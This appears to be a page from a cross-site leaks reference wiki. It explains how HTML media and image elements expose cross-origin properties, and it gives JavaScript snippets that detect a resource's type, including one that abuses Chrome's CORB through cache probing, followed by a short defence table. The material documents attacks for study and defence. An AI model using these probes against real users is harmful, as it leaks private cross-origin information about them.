+++
title = "Element leaks"
description = ""
category = "Attack"
abuse = [
    "HTMLElement",
]
defenses = [
]
menu = "main"
weight = 2
+++

Some HTML Elements leak data cross origin.

- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) leaks the media `duration` and the `buffered` times.
- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) leaks the `videoHeight` and `videoWidth` 
  some browsers may also have `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` and `webkitDecodedFrameCount`
- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) leaks the `totalVideoFrames`.
- [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) leaks the `height` and `width` but if the image is invalid they will be 0 
  and [decode()](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) will get rejected.

Some HTML Elements have properties that predictability change when a valid resource is used this can be checked to detect what the resource type is.
```javascript
async function getType(url) {
    // Detect if resource is audio or video
    let media = document.createElement("video");
    media.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (media.videoWidth) {
    return "video";
    } else if (media.duration) {
    return "audio"
    }
    // Detect if resource is an image
    let image = new Image();
    image.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (image.width) return "image";
}
```

## Abusing CORB
CORB is a feature of Chrome that makes reposnses empty if the wrong content type is used.
This means that if the type is wrong its not cached.
A ifCached function can be found at [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}})
```javascript
async function isType(url, type = "script") {
  let error = false;
  // Purge url
  await ifCached(url, true);
  // Attempt to load resource
  let e = document.createElement(type);
  e.onerror = () => error = true;
  e.src = url;
  document.head.appendChild(e);
  // Wait for it to be cached if its allowed by CORB
  await new Promise(resolve => setTimeout(resolve, 500));
  // Fix for "images" that get blocked differently.
  if (error) return false
  // Cleanup
  document.head.removeChild(e);
  return ifCached(url);
}
```

## Defense

|       Attack Alternative        | [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                          |
| :-----------------------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------: |
|   Type leaks    |                                         ✔️                                          |                          ❌                          |                                 ❌                                 |                                                                                | |
